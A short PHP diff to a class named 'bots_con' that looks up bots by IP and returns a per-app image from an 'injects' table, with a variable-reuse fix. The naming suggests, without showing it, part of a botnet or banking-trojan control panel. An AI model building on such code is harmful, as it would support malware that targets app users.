@@ -324,10 +324,10 @@ class bots_con
         $statement = $connection->prepare("SELECT ip FROM bots WHERE ip=?");
         $statement->execute(array($ip));
         foreach ($statement as $row) {
-            $statement = $connection->prepare("SELECT app, icon FROM injects WHERE app=?");
-            $statement->execute([$injection]);
-            foreach ($statement as $row) {
-                return $row['icon'];
+            $statement1 = $connection->prepare("SELECT app, png FROM injects WHERE app=?");
+            $statement1->execute([$injection]);
+            foreach ($statement1 as $row1) {
+                return $row1['png'];
             }
         }
         return "";
